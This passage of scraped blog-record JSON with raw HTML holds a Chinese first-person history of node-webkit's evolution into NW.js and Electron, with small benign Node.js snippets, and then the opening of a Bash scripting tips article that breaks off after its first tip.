class=\"crayon-sy\">}</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">function</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-594bd5720e27c614396822-3\"><span class=\"crayon-h\">  </span><span class=\"crayon-v\">nwebkit</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">context</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">runScript</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">''</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd5720e27c614396822-4\"><span class=\"crayon-sy\">}</span><span class=\"crayon-sy\">)</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0012 seconds] -->\r\n<p>index.html代码：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd5720e287811546577\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-mixed-highlight\" title=\"含多种语言\"></span><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n&lt;html&gt;&lt;body&gt;\r\n&lt;p id=\"output\"&gt;&lt;/p&gt;\r\n&lt;script&gt;\r\nrequire('fs').readdir('.', function (err, files) {\r\n  var result = ''\r\n  files.forEach(function (filename) { result += filename + '&lt;br/&gt;' } )\r\n  document.getElementById('output').innerHTML = result\r\n});\r\n&lt;/script&gt;\r\n&lt;/body&gt;&lt;/html&gt;</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd5720e287811546577-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd5720e287811546577-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bd5720e287811546577-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd5720e287811546577-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-594bd5720e287811546577-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd5720e287811546577-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-594bd5720e287811546577-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd5720e287811546577-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-594bd5720e287811546577-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd5720e287811546577-10\">10</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd5720e287811546577-1\"><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">html</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">body</span><span class=\"crayon-o\">&gt;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd5720e287811546577-2\"><span class=\"crayon-o\">&lt;</span><span class=\"crayon-i\">p</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">id</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">\"output\"</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">p</span><span class=\"crayon-o\">&gt;</span></div><div class=\"crayon-line\" id=\"crayon-594bd5720e287811546577-3\"><span class=\"crayon-ta\">&lt;script&gt;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd5720e287811546577-4\"><span class=\"crayon-e\">require</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'fs'</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">readdir</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'.'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">function</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">err</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">files</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-594bd5720e287811546577-5\"><span class=\"crayon-h\">  </span><span class=\"crayon-t\">var</span><span class=\"crayon-h\"> </span><span class=\"crayon-e \">result</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">''</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd5720e287811546577-6\"><span class=\"crayon-h\">  </span><span class=\"crayon-v\">files</span><span class=\"crayon-sy\">.</span><span class=\"crayon-st\">forEach</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">function</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">filename</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">result</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">filename</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'&lt;br/&gt;'</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">}</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-594bd5720e287811546577-7\"><span class=\"crayon-h\">  </span><span class=\"crayon-v\">document</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">getElementById</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'output'</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">innerHTML</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">result</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd5720e287811546577-8\"><span class=\"crayon-sy\">}</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-594bd5720e287811546577-9\"><span class=\"crayon-ta\">&lt;/script&gt;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd5720e287811546577-10\"><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">body</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">html</span><span class=\"crayon-o\">&gt;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0041 seconds] -->\r\n<p>大家可以在<a class=\" wrap external\" href=\"https://link.zhihu.com/?target=https%3A//github.com/nwjs/nw.js/tree/webkitgtk\" target=\"_blank\" rel=\"nofollow noreferrer\">NW.js的webkitgtk分支<i class=\"icon-external\"></i></a>里找到node-webkit的原始实现，甚至尝试重新build一遍。不过这个模块一直未能稳定下来，玩具的味道更多一些。</p>\n<p>再后来，原作者 <a class=\" wrap external\" href=\"https://link.zhihu.com/?target=https%3A//github.com/rogerwang\" target=\"_blank\" rel=\"nofollow noreferrer\">rogerwang<i class=\"icon-external\"></i></a> 对其进行了改进，从使用WebKit改成了调用<a class=\" wrap external\" href=\"https://link.zhihu.com/?target=https%3A//bitbucket.org/chromiumembedded/cef\" target=\"_blank\" rel=\"nofollow noreferrer\">Chromium Embedded Framework<i class=\"icon-external\"></i></a>（简称CEF），一个可以把Chromium嵌入应用程序的库。这个代码一直没有正式公布，但大家可以在<a class=\" wrap external\" href=\"https://link.zhihu.com/?target=https%3A//github.com/nwjs/nw.js/tree/cef\" target=\"_blank\" rel=\"nofollow noreferrer\">node-webkit的cef分支<i class=\"icon-external\"></i></a>里找到。代码的另一部分是针对Chromium的几十行补丁，将Chromium的message loop替换为libuv，但是NW.js在开发过程中对代码库进行了很多次rebase操作，原始代码已经找不回来了。</p>\n<p><b>找个实习生来开发</b></p>\n<p>node-webkit的原作者rogerwang在Intel开源技术中心工作，虽然Intel在大家心目中可能更多是个卖CPU的，其实在开源方面也非常热心，甚至提供开源方面的实习工作。</p>\n<p>在2012年的夏天，<a class=\" wrap external\" href=\"https://link.zhihu.com/?target=https%3A//groups.google.com/forum/%23%21searchin/nodejs/node-webkit/nodejs/uPPujFxek7c/uUWgQUeQeHcJ\" target=\"_blank\" rel=\"nofollow noreferrer\">一则Intel的实习信息<i class=\"icon-external\"></i></a>吸引了我的注意，上面说Intel需要一名熟悉Node.js的学生来进行node-webkit的开发。我投了简历，也很幸运地开始了node-webkit的开发。</p>\n<p><b>Content Shell</b></p>\n<p>我最初的工作是对node-webkit的cef分支进行改进，但是很快就发现很难继续进行开发了。CEF提供了自己的一套API来包装Chromium的内部API，而Node.js则是直接调用V8的API，如果想要把CEF和Node.js合并到同一个项目，困难重重。</p>\n<p>于是我干脆将node-webkit推倒重写。新的代码基于<a class=\" wrap external\" href=\"https://link.zhihu.com/?target=https%3A//www.chromium.org/developers/content-module\" target=\"_blank\" rel=\"nofollow noreferrer\">Content Shell<i class=\"icon-external\"></i></a>，一个Chromium代码库内的最小化浏览器实现。</p>\n<p>重写后的结果非常不错，我得到了一个可以调用Node.js模块的浏览器实现。基于这套代码我发布了<a class=\" wrap external\" href=\"https://link.zhihu.com/?target=https%3A//github.com/nwjs/nw.js/tree/v0.2.1\" target=\"_blank\" rel=\"nofollow noreferrer\">node-webkit v0.2.1<i class=\"icon-external\"></i></a>。</p>\n<p><b>把node-webkit进化成桌面开发利器</b></p>\n<p>至此node-webkit已经变成了一个独立的浏览器，而不再是Node.js模块。为什么不把它变成一个使用JavaScript和HTML开发桌面应用的工具呢？后面几个月我开始对这个想法进行尝试。</p>\n<p>首先我模仿游戏框架<a class=\" wrap external\" href=\"https://link.zhihu.com/?target=https%3A//love2d.org/\" target=\"_blank\" rel=\"nofollow noreferrer\">LÖVE framework<i class=\"icon-external\"></i></a>为node-webkit实现了一个打包系统，可以把应用直接附加到exe上：</p>\n<p style=\"text-align: center;\">（node-webkit的打包系统，来自<a class=\" wrap external\" href=\"https://link.zhihu.com/?target=https%3A//speakerdeck.com/zcbenz/node-webkit-app-runtime-based-on-chromium-and-node-dot-js\" target=\"_blank\" rel=\"nofollow noreferrer\">我自己的PPT<i class=\"icon-external\"></i></a>）</p>\n<p><img id=\"pic\" class=\"aligncenter\" src=\"http://wx2.sinaimg.cn/large/63918611gy1ffyu87hhcwj20go08qtb8.jpg\"></p>\n<p>这个打包系统一直沿用到NW.js，但是因为性能方面的种种原因，后来在开发Electron时我并没有使用这套系统。</p>\n<p>接着这是各种细节上的完善：比如利用package.json文件来描述应用；给窗口加工具栏；拓展DOM来提供API；取消浏览器的安全系统；等等。当然还有无休无止的bug修复。</p>\n<p>其中最有挑战性的一点是支持Node.js的native module，我对Chromium打上各种补丁来暴露V8和OpenSSL的API，给Node.js打补丁好解决OpenSSL和NSS之间的符号冲突，提供自定义的node.lib来支持Windows，最后还要提供适用于node-webkit的编译工具。</p>\n<p>完成这些工作以后我发布了<a class=\" wrap external\" href=\"https://link.zhihu.com/?target=https%3A//github.com/nwjs/nw.js/commits/v0.2.5\" target=\"_blank\" rel=\"nofollow noreferrer\">node-webkit v0.2.5<i class=\"icon-external\"></i></a>。</p>\n<p><b>提供构建GUI的API</b></p>\n<p>这时我的绝大部分工作都在围着浏览器转，而由于浏览器自身的局限性很多功能我都没法提供。比方说浏览器里就没法创建系统原生的菜单。（当然今天已经有了HTML5 Menu标签，而当时是2012年。）</p>\n<p>于是我想到增加一个新的内置模块，用来提供对窗口、菜单等系统API的绑定，也就是：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd5720e28f681736241\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nrequire('nw.gui')</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd5720e28f681736241-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd5720e28f681736241-1\"><span class=\"crayon-e\">require</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'nw.gui'</span><span class=\"crayon-sy\">)</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p>如果你有使用过NW.js的话，你应该很熟悉这一套API。</p>\n<p>经过几个月的完善后，我发布了<a class=\" wrap external\" href=\"https://link.zhihu.com/?target=https%3A//github.com/nwjs/nw.js/commits/v0.3.6\" target=\"_blank\" rel=\"nofollow noreferrer\">node-webkit v0.3.6<i class=\"icon-external\"></i></a>，这也是由我维护的最后一个版本。</p>\n<p><b>node-webkit的推广</b></p>\n<p>虽然node-webkit属于Intel，但其更多属于rogerwang的个人项目，那时候这个项目在GitHub上也还挂在rogerwang的账户下。所以当时除了我自己一个人，没有其他任何来自Intel的资源投入。</p>\n<p>而像node-webkit这样的框架类项目，只有拥有用户，才会有生存下去的意义，所以在开发node-webkit的半年时间里，我也一直有在积极推广。</p>\n<p>首先是到处发帖子宣传node-webkit的好处，一大阵地是Node.js的邮件列表。每次有新版本我就会过去<a class=\" wrap external\" href=\"https://link.zhihu.com/?target=https%3A//groups.google.com/forum/%23%21searchin/nodejs/node-webkit/nodejs/yFiEUM3TnMs/KW9qxv7X0rkJ\" target=\"_blank\" rel=\"nofollow noreferrer\">发布公告<i class=\"icon-external\"></i></a>，回答问题，与人撕逼。其次则是<a class=\" wrap external\" href=\"https://link.zhihu.com/?target=https%3A//github.com/zcbenz/nw-sample-apps\" target=\"_blank\" rel=\"nofollow noreferrer\">编写范例应用<i class=\"icon-external\"></i></a>，让新手快速入门，让其他人相信node-webkit的能力。最后则是<a class=\" wrap external\" href=\"https://link.zhihu.com/?target=http%3A//2012.jsconf.cn/\" target=\"_blank\" rel=\"nofollow noreferrer\">去技术会议宣传<i class=\"icon-external\"></i></a>，让大家知道node-webkit这个东西。</p>\n<p>当然最重要的还是认真回答Issues里的问题，努力修复bug增加功能。</p>\n<p>我的努力最后也得到了非常好的回报，在我结束node-webkit开发的时候，项目在GitHub上获得了数千个star，排到了C++项目排行的前十。</p>\n<p><b>第一个用户</b></p>\n<p>另外值得一提的是node-webkit的第一个用户，<a class=\" wrap external\" href=\"https://link.zhihu.com/?target=http%3A//www.chris-granger.com/2012/11/05/meet-the-new-light-table/\" target=\"_blank\" rel=\"nofollow noreferrer\">Light Table </a>编辑器。这个编辑器的作者 <a class=\" wrap external\" href=\"https://link.zhihu.com/?target=https%3A//github.com/ibdknox\" target=\"_blank\" rel=\"nofollow noreferrer\">ibdknox<i class=\"icon-external\"></i></a> 很大胆地使用了node-webkit来进行开发，当时为node-webkit迎来了非常多的关注，也给大家吃了一枚定心丸，为项目推广助力巨大。</p>\n<p>几年后Light Table又从node-webkit<a class=\" wrap external\" href=\"https://link.zhihu.com/?target=https%3A//github.com/LightTable/LightTable/pull/1756\" target=\"_blank\" rel=\"nofollow noreferrer\">迁移到了Electron<i class=\"icon-external\"></i></a>，当时好似好友重逢，感触良多。</p>\n<p><b>工作的转移</b></p>\n<p>在我为node-webkit工作半年之后，2012年底，这个项目开始吸引越来越多的注意力，也开始引起Intel一定程度的注意。rogerwang得到了机会放下其他的工作，开始全职维护node-webkit。</p>\n<p style=\"text-align: center;\">（GitHub的代码贡献表）</p>\n<p><img id=\"pic\" class=\"aligncenter\" src=\"http://wx2.sinaimg.cn/large/63918611gy1ffyu8ao0osj20go083myb.jpg\"></p>\n<p>大家如果有在比较大的公司工作过，之前可能会奇怪，为什么一个实习生能如此随意地修改代码，发布新版本。其实正是因为这个项目当时在Intel内部无人关注，无人管理，我才得以随心所欲地尝试各种想法。</p>\n<p>但之后正当node-webkit冉冉升起之时，我却彻底失去了node-webkit的自治权，开始收到命令去完成指定的开发工作，被禁止随意去增加功能，也不允许去随意修复bug，而发布新版本、和客户交流的工作也被转移给更高级别的工程师手上。正如一个大公司里的螺丝钉。</p>\n<p>可能这种开发方式才是大公司的常态，我也不想抱怨任何人，但是抱歉，我只是一点也忍不了。</p>\n<p><b>为GitHub而战</b></p>\n<p>在我进行node-webkit开发的同时，GitHub正在秘密开发Atom编辑器。我了解到GitHub正在寻求一种使用HTMl和Node.js来开发桌面应用的方式，于是联系到Github<br>\n的工程师<a class=\" wrap external\" href=\"https://link.zhihu.com/?target=https%3A//github.com/nathansobo\" target=\"_blank\" rel=\"nofollow noreferrer\">nathansobo<i class=\"icon-external\"></i></a>，表达了为GitHub工作的意愿。</p>\n<p>所幸node-webkit已经为我自己博得了足够的名气，在一面未见的情况下，我们敲定了协议，我需要将Atom迁移到node-webkit之上，并且提供支持工作。</p>\n<p>于是2012年底，我结束了在Intel的实习，开始为GitHub作为contractor工作。</p>\n<p><b>一个更好的桌面应用框架</b></p>\n<p>在我加入Atom的开发时，项目还基于CEF。<a class=\" wrap external\" href=\"https://link.zhihu.com/?target=https%3A//github.com/atom/atom/pull/100\" target=\"_blank\" rel=\"nofollow noreferrer\">我们尝试了将Atom迁移到node-webkit上面<i class=\"icon-external\"></i></a>，但是最终效果并不是很好，node-webkit当时并不稳定，而且API有太多的坑。</p>\n<p>于是我开始重新考虑node-webkit的API设计，发现如果想要支撑大型应用，我不得不做出很多结构性的改变，而这些改变与其修改node-webkit，不如重写更加实际。在和GitHub讨论之后，我开始编写一个新的桌面应用框架，当时的名称叫做atom-shell。</p>\n<p>有兴趣的同学可以去了解一下<a class=\" wrap external\" href=\"https://link.zhihu.com/?target=http%3A//electron.atom.io/docs/development/atom-shell-vs-node-webkit/\" target=\"_blank\" rel=\"nofollow noreferrer\">我们究竟做了哪些改变<i class=\"icon-external\"></i></a>。</p>\n<p><b>左右互搏</b></p>\n<p>后来，经过长时间的开发，atom-shell最终开放了源代码，而与此同时node-webkit 已经吸引了非常多的注意力和用户，我开始了和自己的竞争。</p>\n<p>再之后node-webkit改名为NW.js，而atom-shell则改名为Electron。</p>\n<p style=\"text-align: center;\">（Electron 1.0）</p>\n<p><img id=\"pic\" class=\"aligncenter\" src=\"http://wx4.sinaimg.cn/large/63918611gy1ffyu8ew4xcj20go06odhb.jpg\"></p>\n<p><b>维护开源项目的生活</b></p>\n<p>说完了从node-webkit到Electron进化的历程，最后说说维护开源项目的体验吧。</p>\n<p>和普通项目不同，开源项目几乎所有的用户都来自公司外部，取决于项目的受欢迎程度，每天都会受到相当大数量的邮件。就我自己而言，来自GitHub的通知邮件每天数量在50封左右，需要花1到3小时左右一一消化回复。很多issue要去仔细重现，一些话题也需要大量的讨论，很费神。甚至会有troll过来破坏所有人的心情。</p>\n<p>其中最让人无奈的<a class=\" wrap external\" href=\"https://link.zhihu.com/?target=https%3A//github.com/GnorTech\" target=\"_blank\" rel=\"nofollow noreferrer\">一个troll<i class=\"icon-external\"></i></a>，最爱跑到issue下面留言，指摘Electron抄袭NW.js的代码，剽窃NW.js的理念，还到处劝人转用NW.js。简直了。</p>\n<p>维护项目的另一项工作，是审核pull request，和维护node-webkit时不同，Electron的用户群要大很多，所以每天都会收到pull request，其中不乏高质量的代码。但多数时候代码都不能直接合并，要么设计不合理，要么代码不合规范，更多地则是引入新bug。所以每个pull request都需要细心查看，还少不了和贡献者大量的讨论。</p>\n<p>于是，做完这些工作以后，留给写代码的时候反而少了很多，也是没有办法。但对于一个开源项目而言，这些琐碎的工作其实非常重要，只要让人感觉你的项目在被精心维护，才能不断吸引更多用户。一个维护不善的项目，哪怕初期因为种种原因吸引了很多用户，一旦更好的替代品出现，用户马上会飞速流失。</p>\n<p>生活上，因为是全职做开源，影响反而非常小。GitHub的远程工作氛围非常浓厚，我的大部分工作时间也是在家里而不是办公室里，所以多数时候是想写代码了便开始工作，不在状态就把工作放在一边去做做喜欢的事，以此用有限的时间维持非常高的工作效率。</p>\n<p>但开源会给自己带来另一个问题，责任感。一个没人用的项目，弃坑不过是一转念的事情，但是当越来越多人开始用你的项目，甚至有<a class=\" wrap external\" href=\"https://link.zhihu.com/?target=https%3A//www.brave.com/\" target=\"_blank\" rel=\"nofollow noreferrer\">创业公司<i class=\"icon-external\"></i></a>把未来压在你的项目上，责任感会越来越重，你唯一的选择就是将项目继续维护下去，无法弃坑，直到更好的技术出现。</p>\n<p>不知道我未来还会维护Electron多久，不过就过去几年来看，还挺开心的，应该还会继续做下去吧。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"111189\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"111189votetotal\">2</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"111189\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2017/05/b94146f42c8e0ca2b0f04ed89b59053c.jpg"], "fav_nums": 1, "comment_nums": 0, "create_date": "2017/05/26", "praise_nums": 2}
{"tags": "Bash,IT技术,Linux", "front_image_path": "full/aba8a39617598b9aa209e097640c72a63135a000.jpg", "title": "Linux 中高效编写 Bash 脚本的 10 个技巧", "url_object_id": "9c36e71c307939b4d10f479fb6f902f3", "url": "http://blog.jobbole.com/111514/", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://www.tecmint.com/useful-tips-for-writing-bash-scripts-in-linux/\">Aaron Kili</a>   译文出处：<a target=\"_blank\" href=\"https://linux.cn/article-8618-1.html\">Linux中国/ch-cn</a>   </div><p>Shell 脚本编程 是你在 Linux 下学习或练习编程的最简单的方式。尤其对 系统管理员要处理着自动化任务，且要开发新的简单的实用程序或工具等（这里只是仅举几例）更是必备技能。</p>\n<p>本文中，我们将分享 10 个写出高效可靠的 bash 脚本的实用技巧，它们包括：</p>\n<h3 id=\"toc_1\">1、 脚本中多写注释</h3>\n<p>这是不仅可应用于 shell 脚本程序中，也可用在其他所有类型的编程中的一种推荐做法。在脚本中作注释能帮你或别人翻阅你的脚本时了解脚本的不同部分所做的工作。</p>\n<p>对于刚入门的人来说，注释用 <code>#</code> 号来定义。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bbf1ab1cec733158094\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n# TecMint 是浏览各类 Linux 文章的最佳站点</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px 